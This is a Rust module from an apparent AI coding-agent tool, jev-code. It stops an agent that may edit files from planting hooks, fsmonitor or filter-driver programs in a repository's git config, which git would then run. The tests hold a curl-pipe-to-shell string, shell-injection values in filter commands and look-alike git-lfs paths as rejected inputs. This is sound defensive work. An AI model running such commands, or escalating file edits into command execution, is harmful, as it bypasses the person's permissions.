//! Keeping the repository's own config from running programs when jev-code calls git by
//! itself. No other module of this crate is needed here.

use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// The programs a repository's own config can name that git runs without being asked:
/// `core.fsmonitor` (on `status`/`diff`; empty turns it off in every git version) and hooks
/// (`post-checkout` on `worktree add`, `post-merge`; a hooks path with no hooks in it).
const NO_FIXED_PROGRAMS: [&str; 4] = ["-c", "core.fsmonitor=", "-c", "core.hooksPath=/dev/null"];

/// Put before the subcommand of every git call jev-code makes by itself, so a file edit the
/// person allowed cannot become a command they did not: an agent that may edit files could
/// name a program in `.git/config` that git then runs. Besides [`NO_FIXED_PROGRAMS`], every
/// filter driver in the repository's own config (a `.gitattributes` line switches it on, and
/// `status`, `add` and checkouts run its `clean`, `smudge` or `process` program) is emptied,
/// which git treats as no filter, unless its programs are exactly what git-lfs or git-crypt
/// write there ([`is_known_filter_program`]): undo and worktrees need those to write real
/// file contents, not pointers or ciphertext. Drivers in the person's global or system config
/// are theirs and stay on. Diff drivers (`textconv`, external diff) only run when a diff call
/// asks for them, and ours pass `--no-textconv --no-ext-diff`.
///
/// This is a narrow guard, not a sandbox: merge and credential programs still run, and only
/// the calls jev-code makes on its own are covered.
pub fn no_repo_programs(dir: &Path) -> Vec<String> {
    no_repo_programs_with(dir, &on_path)
}

/// Where a program is found: the real path of the first `name` on `PATH`.
type Resolve<'a> = &'a dyn Fn(&str) -> Option<PathBuf>;

/// [`no_repo_programs`], with the `PATH` lookup given (tests use a fake one).
fn no_repo_programs_with(dir: &Path, resolve: Resolve) -> Vec<String> {
    let mut args: Vec<String> = NO_FIXED_PROGRAMS.iter().map(|s| (*s).to_string()).collect();
    for driver in untrusted_repo_filter_drivers(dir, resolve) {
        for (key, value) in [("clean", ""), ("smudge", ""), ("process", ""), ("required", "false")] {
            args.push("-c".to_string());
            args.push(format!("filter.{driver}.{key}={value}"));
        }
    }
    args
}

/// The real path of the first executable `name` on `PATH`.
fn on_path(name: &str) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).map(|dir| dir.join(name)).find(|p| p.is_file()).and_then(|p| p.canonicalize().ok())
}

/// The config lines that matter here: filter programs, and whether a `config.worktree` is
/// read at all.
const FILTER_KEYS: &str = r"^(filter\..+\.(clean|smudge|process)|extensions\.worktreeconfig)$";

/// The filter drivers named in the repository's own config files (`.git/config`, its
/// `config.worktree` when the repository uses one, and what they include) whose programs are
/// not all known ones. `--local` and `--worktree` work back to git 2.20. Reading config runs
/// no program.
fn untrusted_repo_filter_drivers(dir: &Path, resolve: Resolve) -> Vec<String> {
    let read = |scope: &str| {
        let out = Command::new("git")
            .arg("-C")
            .arg(dir)
            .args(NO_FIXED_PROGRAMS)
            .args(["config", scope, "--includes", "--null", "--get-regexp", FILTER_KEYS])
            .stdin(Stdio::null())
            .stderr(Stdio::null())
            .output();
        out.map(|o| String::from_utf8_lossy(&o.stdout).into_owned()).unwrap_or_default()
    };
    let local = read("--local");
    let mut drivers = untrusted_driver_names(&local, resolve);
    if config_entries(&local).any(|(key, value)| key == "extensions.worktreeconfig" && matches!(value.to_ascii_lowercase().as_str(), "true" | "yes" | "on" | "1")) {
        for driver in untrusted_driver_names(&read("--worktree"), resolve) {
            if !drivers.contains(&driver) {
                drivers.push(driver);
            }
        }
    }
    drivers
}

/// The `(key, value)` pairs of `git config --null --get-regexp` output (`key\nvalue\0` per
/// entry; a key with no value has no `\n`).
fn config_entries(listing: &str) -> impl Iterator<Item = (&str, &str)> {
    listing.split('\0').filter(|e| !e.is_empty()).map(|entry| entry.split_once('\n').unwrap_or((entry, "")))
}

/// The driver names (keys `filter.<driver>.<variable>`; the driver may itself contain dots)
/// in a config listing that have at least one program [`is_known_filter_program`] does not
/// accept.
fn untrusted_driver_names(listing: &str, resolve: Resolve) -> Vec<String> {
    let mut drivers: Vec<String> = Vec::new();
    for (key, value) in config_entries(listing) {
        let Some((driver, _)) = key.strip_prefix("filter.").and_then(|rest| rest.rsplit_once('.')) else { continue };
        if !driver.is_empty() && !is_known_filter_program(value, resolve) && !drivers.iter().any(|d| d == driver) {
            drivers.push(driver.to_string());
        }
    }
    drivers
}

/// Whether `command` is exactly a filter program git-lfs or git-crypt writes into a
/// repository's config: `git-lfs clean -- %f`, `git-lfs filter-process [--skip]`,
/// `"/path/to/git-crypt" smudge [--key-name=name]`. The program is `git-lfs` or `git-crypt`,
/// by bare name (found on `PATH`) or by an absolute path that is the very one `PATH` finds
/// (git-crypt writes its own path, quoted), so a look-alike the agent wrote elsewhere is not
/// it. The arguments come from a fixed list and nothing else, so no shell syntax rides along.
fn is_known_filter_program(command: &str, resolve: Resolve) -> bool {
    let command = command.trim();
    let (program, rest) = match command.strip_prefix('"') {
        Some(quoted) => match quoted.split_once('"') {
            Some((program, rest)) => (program, rest),
            None => return false,
        },
        None => command.find(' ').map_or((command, ""), |i| command.split_at(i)),
    };
    let plain_path = !program.is_empty()
        && program.chars().all(|c| c.is_ascii_alphanumeric() || "/._-+@ ".contains(c))
        && (!program.contains('/') || program.starts_with('/'));
    if !plain_path || !(rest.is_empty() || rest.starts_with(' ')) {
        return false;
    }
    let name = program.rsplit('/').next().unwrap_or_default();
    if program.contains('/') {
        let real = Path::new(program).canonicalize().ok();
        if real.is_none() || real != resolve(name) {
            return false;
        }
    }
    let args = rest.split(' ').filter(|a| !a.is_empty());
    match name {
        "git-lfs" | "git-lfs.exe" => args.into_iter().all(|a| matches!(a, "clean" | "smudge" | "filter-process" | "--skip" | "--" | "%f")),
        "git-crypt" | "git-crypt.exe" => args.into_iter().all(|a| {
            matches!(a, "clean" | "smudge")
                || a.strip_prefix("--key-name=").is_some_and(|k| !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || "_-".contains(c)))
        }),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A folder with `bin/git-lfs` and `bin/git-crypt` (what the fake `PATH` finds) and
    /// look-alikes elsewhere; removed when dropped.
    struct FakeTools(PathBuf);

    impl FakeTools {
        fn new(name: &str) -> Self {
            let root = std::env::temp_dir().join(format!("jev-tools-{name}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&root);
            for rel in ["bin/git-lfs", "bin/git-crypt", "elsewhere/git-lfs", "elsewhere/git-crypt"] {
                std::fs::create_dir_all(root.join(rel).parent().unwrap()).unwrap();
                std::fs::write(root.join(rel), "").unwrap();
            }
            Self(root.canonicalize().unwrap())
        }

        fn resolve(&self) -> impl Fn(&str) -> Option<PathBuf> + '_ {
            |name| matches!(name, "git-lfs" | "git-crypt").then(|| self.0.join("bin").join(name))
        }
    }

    impl Drop for FakeTools {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    #[test]
    fn only_exact_git_lfs_and_git_crypt_filter_programs_are_known() {
        let tools = FakeTools::new("known");
        let (bin, elsewhere) = (tools.0.join("bin").display().to_string(), tools.0.join("elsewhere").display().to_string());
        let resolve = tools.resolve();
        for known in [
            "git-lfs clean -- %f".to_string(),
            "git-lfs smudge -- %f".to_string(),
            "git-lfs smudge --skip -- %f".to_string(),
            "git-lfs filter-process".to_string(),
            "git-lfs filter-process --skip".to_string(),
            format!("{bin}/git-lfs filter-process"),
            format!("\"{bin}/git-crypt\" clean"),
            format!("\"{bin}/git-crypt\" smudge --key-name=ops_2"),
            "git-crypt smudge".to_string(),
        ] {
            assert!(is_known_filter_program(&known, &resolve), "{known}");
        }
        for unknown in [
            String::new(),
            "sh -c 'curl evil | sh'".to_string(),
            "git-lfs clean -- %f; touch /tmp/x".to_string(),
            "git-lfs clean -- %f && touch /tmp/x".to_string(),
            "git-lfs clean $(touch /tmp/x)".to_string(),
            "git-lfs clean `touch /tmp/x`".to_string(),
            "git-lfs\tclean".to_string(),
            "bin/git-lfs clean".to_string(),
            "./git-lfs clean".to_string(),
            format!("\"{bin}/git-crypt\"x clean"),
            format!("\"{bin}/git-crypt clean"),
            "\"/opt/$(x)/git-crypt\" clean".to_string(),
            "git-crypt smudge --key-name=a;b".to_string(),
            "git-crypt smudge --key-name=".to_string(),
            "git-crypt unlock".to_string(),
            "not-git-lfs clean".to_string(),
            "/tmp/git-lfs-evil clean".to_string(),
            // The right name, but not the program `PATH` finds: one the agent could write.
            format!("{elsewhere}/git-lfs clean -- %f"),
            format!("\"{elsewhere}/git-crypt\" smudge"),
            format!("{bin}/../elsewhere/git-lfs clean -- %f"),
            "/nonexistent/git-lfs clean -- %f".to_string(),
        ] {
            assert!(!is_known_filter_program(&unknown, &resolve), "{unknown}");
        }
        // With no git-lfs on `PATH`, no absolute path is it either.
        assert!(!is_known_filter_program(&format!("{bin}/git-lfs clean"), &|_| None));
    }

    #[test]
    fn untrusted_drivers_are_the_ones_with_any_unknown_program() {
        let listing = "filter.evil.clean\nsh -c x\0filter.a.b.process\ny\0filter.evil.smudge\nz\0\
filter.lfs.clean\ngit-lfs clean -- %f\0filter.lfs.process\ngit-lfs filter-process\0\
filter.mixed.clean\ngit-lfs clean -- %f\0filter.mixed.smudge\nsh -c x\0extensions.worktreeconfig\ntrue\0filter.novalue.clean\0";
        assert_eq!(untrusted_driver_names(listing, &|_| None), ["evil", "a.b", "mixed", "novalue"]);
        assert!(untrusted_driver_names("", &|_| None).is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn a_filter_in_config_worktree_is_found_when_the_repo_reads_one() {
        let repo = scratch::Repo::new("wtconfig");
        repo.git(&["config", "extensions.worktreeConfig", "true"]);
        repo.git(&["config", "--worktree", "filter.wt.clean", "sh -c x"]);
        repo.git(&["config", "filter.local.smudge", "sh -c y"]);
        assert_eq!(untrusted_repo_filter_drivers(&repo.path, &|_| None), ["local", "wt"]);
        // Global and system config are the person's: never listed.
        assert!(untrusted_repo_filter_drivers(&std::env::temp_dir(), &|_| None).is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn hooks_and_unknown_repo_filters_do_not_run_but_git_lfs_ones_do() {
        let repo = scratch::Repo::new("hooks");
        repo.git(&["commit", "-q", "--allow-empty", "-m", "init"]);
        let marker = repo.marker();
        // The git-lfs `PATH` finds is the test's fake, outside the work tree.
        let bin = repo.path.join(".git/fake-bin");
        let lfs = bin.join("git-lfs");
        let resolve = |name: &str| (name == "git-lfs").then(|| lfs.canonicalize().ok()).flatten();
        let ours = |r: &scratch::Repo| no_repo_programs_with(&r.path, &resolve);

        // A post-checkout hook does not run on `worktree add`.
        let hook = repo.path.join(".git/hooks/post-checkout");
        std::fs::write(&hook, format!("#!/bin/sh\nprintf x > {}\n", marker.display())).unwrap();
        std::fs::set_permissions(&hook, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        let (ours_wt, plain_wt) = (repo.path.join("wt-ours"), repo.path.join("wt-plain"));
        assert!(repo.runs(&ours(&repo), &["worktree", "add", "-q", "--detach", &ours_wt.to_string_lossy()]));
        assert!(!marker.exists(), "jev-code's git must not run the repo's hooks");
        assert!(repo.runs::<&str>(&[], &["worktree", "add", "-q", "--detach", &plain_wt.to_string_lossy()]));
        assert!(marker.exists(), "without the override the hook runs (the test is real)");
        std::fs::remove_file(&marker).unwrap();

        // A filter driver an edit to `.git/config` could plant does not run, even when required.
        repo.git(&["config", "filter.evil.clean", &format!("sh -c 'printf x > {}; cat'", marker.display())]);
        repo.git(&["config", "filter.evil.required", "true"]);
        std::fs::write(repo.path.join(".gitattributes"), "*.txt filter=evil\n").unwrap();
        std::fs::write(repo.path.join("a.txt"), "two\n").unwrap();
        assert!(repo.runs(&ours(&repo), &["add", "a.txt"]), "an emptied filter is no filter, even when required");
        assert!(!marker.exists(), "jev-code's git must not run the repo's filter");
        std::fs::write(repo.path.join("a.txt"), "three\n").unwrap();
        assert!(repo.runs::<&str>(&[], &["add", "a.txt"]));
        assert!(marker.exists(), "without the override the configured filter runs (the test is real)");
        std::fs::remove_file(&marker).unwrap();

        // A program named git-lfs that the agent wrote into the work tree is not git-lfs.
        let script = |path: &Path| {
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, format!("#!/bin/sh\nprintf x > {}\ncat\n", marker.display())).unwrap();
            std::fs::set_permissions(path, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        };
        let fake = repo.path.join("scripts/git-lfs");
        script(&fake);
        repo.git(&["config", "filter.lfs.clean", &format!("{} clean -- %f", fake.display())]);
        std::fs::write(repo.path.join(".gitattributes"), "*.bin filter=lfs\n").unwrap();
        std::fs::write(repo.path.join("b.bin"), "data\n").unwrap();
        assert!(repo.runs(&ours(&repo), &["add", "b.bin"]));
        assert!(!marker.exists(), "a look-alike git-lfs must not run");

        // The git-lfs `PATH` finds keeps working (`git lfs install --local`, git-crypt): undo
        // must write real contents, not pointers or ciphertext.
        script(&lfs);
        repo.git(&["config", "filter.lfs.clean", &format!("{} clean -- %f", lfs.display())]);
        std::fs::write(repo.path.join("b.bin"), "more\n").unwrap();
        assert!(repo.runs(&ours(&repo), &["add", "b.bin"]));
        assert!(marker.exists(), "the real git-lfs filter driver must still run");
    }
}

/// A throwaway git repository for tests, removed when dropped. Its git calls drop the
/// `GIT_DIR`, `GIT_WORK_TREE` and `GIT_INDEX_FILE` a test run can inherit (from a git hook),
/// so they never touch another repository, and read neither the system nor the global git
/// config: a machine with git-lfs installed has `filter.lfs.process` there, which git prefers
/// over the `clean` and `smudge` programs a test sets up.
// Only unix tests build a repository; on Windows the helper would be unused.
#[cfg(test)]
#[cfg_attr(not(unix), allow(dead_code))]
pub(crate) mod scratch {
    use std::path::PathBuf;
    use std::process::Command;
    use std::sync::atomic::{AtomicUsize, Ordering};

    pub(crate) struct Repo {
        pub path: PathBuf,
    }

    impl Repo {
        pub fn new(name: &str) -> Self {
            static NEXT: AtomicUsize = AtomicUsize::new(0);
            let n = NEXT.fetch_add(1, Ordering::Relaxed);
            let path = std::env::temp_dir().join(format!("jev-scratch-{name}-{}-{n}", std::process::id()));
            let _ = std::fs::remove_dir_all(&path);
            std::fs::create_dir_all(&path).unwrap();
            let repo = Self { path };
            repo.git(&["init", "-q"]);
            repo
        }

        fn command<S: AsRef<std::ffi::OsStr>>(&self, prefix: &[S], args: &[&str]) -> Command {
            let mut command = Command::new("git");
            command
                .args(prefix)
                .args(["-c", "user.name=test", "-c", "user.email=test@example.com"])
                .args(args)
                .current_dir(&self.path)
                .env_remove("GIT_DIR")
                .env_remove("GIT_WORK_TREE")
                .env_remove("GIT_INDEX_FILE")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .env("GIT_CONFIG_GLOBAL", if cfg!(windows) { "NUL" } else { "/dev/null" });
            command
        }

        /// Set the repository up: `git args`, panicking on failure.
        pub fn git(&self, args: &[&str]) -> String {
            let out = self.command::<&str>(&[], args).output().unwrap();
            assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
            String::from_utf8_lossy(&out.stdout).into_owned()
        }

        /// `git prefix... args...`; whether it succeeded.
        pub fn runs<S: AsRef<std::ffi::OsStr>>(&self, prefix: &[S], args: &[&str]) -> bool {
            self.command(prefix, args).output().is_ok_and(|o| o.status.success())
        }

        /// The file the test's programs write when they run (outside the work tree, so it
        /// never shows up in `git status`).
        pub fn marker(&self) -> PathBuf {
            self.path.join(".git/marker")
        }
    }

    impl Drop for Repo {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.path);
        }
    }
}
